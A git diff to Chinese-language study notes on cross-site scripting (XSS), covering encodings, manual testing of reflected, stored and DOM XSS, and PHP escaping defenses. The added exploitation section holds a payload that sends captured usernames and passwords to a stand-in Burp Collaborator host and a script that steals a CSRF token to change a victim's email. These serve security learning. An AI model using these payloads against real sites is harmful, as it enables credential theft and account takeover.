@@ -25,7 +25,16 @@ XSS漏洞的核心就是，网页执行了构造的恶意脚本。至于如何�
 - 对输入进行过滤
 - 对输出进行转义
 
+# XSS编码方式
+
+三种编码：
+
+- HTML编码
+- URL编码
+- unicode编码
+
 ## 主要类型以及原理？
+
 - 反射型
   - 顾名思义，恶意 JavaScript 脚本属于用户发送给网站请求中的一部分，随后网站又将这部分返回给用户，恶意脚本在页面中被执行。一般发生在前后端一体的应用中，服务端逻辑会改变最终的网页代码。
     eg: ?input=<script>alert(1)</script>
@@ -87,13 +96,63 @@ post提交的内容是恶意内容，value值。
 
 
 
+# 如何发现
+
+**手动测试反射型XSS步骤：**
+
+- 测试每个入口点
+- 提交随机字母数字值
+- 确定反射型上下文
+- 测试候选有效载荷
+- 测试替代有效载荷
+- 在浏览器中测试攻击
+
+**手动测试存储型XSS步骤：**
+
+- 根据”出口点“确定“入口点”（利用页面显示的用户内容，确定用户从哪些地方提交可得）
+- 对每个“入口点”提交payload，并观察页面返回结果
+
+**手动测试DOM型XSS步骤：**
+
+- 数据从源输入--》接收器获取数据并显示
+  - 源：window.location.search
+  - 接收器：
+    - document.write()：可以写入script语句
+    - element.innerHTML/outerHTML：不会触发script、svg onload事件，可以使用img、iframe的onload、onerror事件
+    - element.insertAdjacentHTML
+    - element.onevent
+    - $('').attr('href','')：利用jQuery对各种属性值修改  
+      - eg：`$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));`
+    - jQuery函数：add() after() append() animate() insertAfter() insertBefore() before() html() prepend()
+    - 
+- 测试HTML接收器
+  - 利用搜索的方式，查看字符串出现的上下文，并根据上下文不断优化输入
+- 测试JS接收器
+  - 找到js源码
+  - 下断点，对js进行调试
+- 利用DOM Invader插件
+- 使用AngularJS框架
+  - 可以在没有尖括号或事件的情况下执行js代码
+  - class为ng-app时，使用AngularJS处理
+  - eg：`{{$on.constructor('alert(1)')()}}`
+
+payload
+
+- alert(1)
+- print() ：新版本chrome禁止跨域iframe调用alert()
+
+反射型：`https://insecure-website.com/search?term=<script>/*+Bad+stuff+here...+*/</script>`
+
+存储型：
+
 ## 如何防护
+
 根据恶意内容在浏览器上显示的位置不同划分：
 
-1. html普通标签位置输出
+1. **html普通标签位置输出**
    
    将内容输出到`<div> 、<p> `等html中常见的标签中，当作标签的内容显示。
-  
+
   -->直接使用htmlspecialchars实体编码即可，将特殊字符进行html编码后，浏览器再自动解码，即仅显示内容，而不会去解析其语法含义。
 
    eg:
@@ -106,15 +165,16 @@ post提交的内容是恶意内容，value值。
         <?php echo $div;?>
       <div>
       ```
-   
+
    
 
-2. 普通标签的普通属性
+
+2. **普通标签的普通属性**
    
    如输出到input的value属性值
-  
+
   -->直接使用htmlspecialchars实体编码即可
-   
+
    ```php
     $msg .= $_GET['msg'];
       //    防范措施:html实体编码
@@ -124,7 +184,7 @@ post提交的内容是恶意内容，value值。
     </form>
    ```
 
-3. 输出在事件属性中
+3. **输出在事件属性中**
 
   输出位置在标签的事件属性中，如onmouseover
   -->
@@ -135,14 +195,14 @@ post提交的内容是恶意内容，value值。
     </form>
   ```
 
-4. 输出在特殊的属性中
+4. **输出在特殊的属性中**
 
   如a标签的href属性
-  
+
   --> 按输入的内容的合法格式进行正则匹配，检查是否是url，再进行html实体编码。
-  
+
   a标签中href属性支持javascript:伪代码执行
-  
+
   ```php
   function check_url($url){
     if (preg_match('/\Ahttp:/',$url) || preg_match('/\Ahttps:/',$url) || preg_match('#\A/#',$url)){
@@ -159,13 +219,13 @@ post提交的内容是恶意内容，value值。
 
   ```
 
-5. 输出点在js中
+5. **输出点在js中**
 
   输出内容在一段js代码中
   -->转义函数:所有的字符串,除字母,数字,.号,-号外的其他全部进行转义为unicode(utf-8是unicode的一种实现),unicode可以在js中可以被正常解析使用,所有的转义操作在后台进行后输出到前台。
-  
+
   注意：js本身不解析html实体字符
-  
+
   ```php
   //转换字符的编码
   function unicode_escape($str){
@@ -247,3 +307,67 @@ post提交的内容是恶意内容，value值。
    需要检验其内容，禁止以javascript:开头的链接或者其他非法的scheme
 
 4. 不要随意打开一些来历不明的网站或链接
+
+## 过滤绕过
+
+1. 使用replace函数对<>进行html编码--》只会进行一次替换
+2. 
+
+# 利用方式
+
+## 窃取cookie
+
+利用XSS漏洞将cookie发送到攻击方，然后手动注入cookie冒充受害者进行各类操作
+
+局限性：
+
+- 受害者可能没有登录
+- HttpOnly属性，导致无法利用js读取cookie
+- 会话可能与用户的其他属性绑定，比如用户IP等
+- 会话可能超时
+
+结合使用burp的collaborator模块使用
+
+## 获取密码
+
+读取密码管理器中存储的用户名和密码
+
+局限性：
+
+- 仅适用于拥有密码自动填充的密码管理器
+- 也可以通过网络钓鱼的方式来获取密码
+
+```html
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+```
+
+
+
+## 结合csrf攻击
+
+XSS漏洞-->可以任意执行一段代码，只要是利用js可以实现的代码都可以
+
+CSRF-->服务端对动作执行的来源没有经过严谨的验证，也就是不确定是用户真实已知的操作
+
+这里虽然利用页面中的token来防止csrf，但利用js的request对应页面，然后提取其中的token作为参数即可
+
+```javascript
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.send('csrf='+token+'&email=test@test.com')
+};
+</script>
+```
+
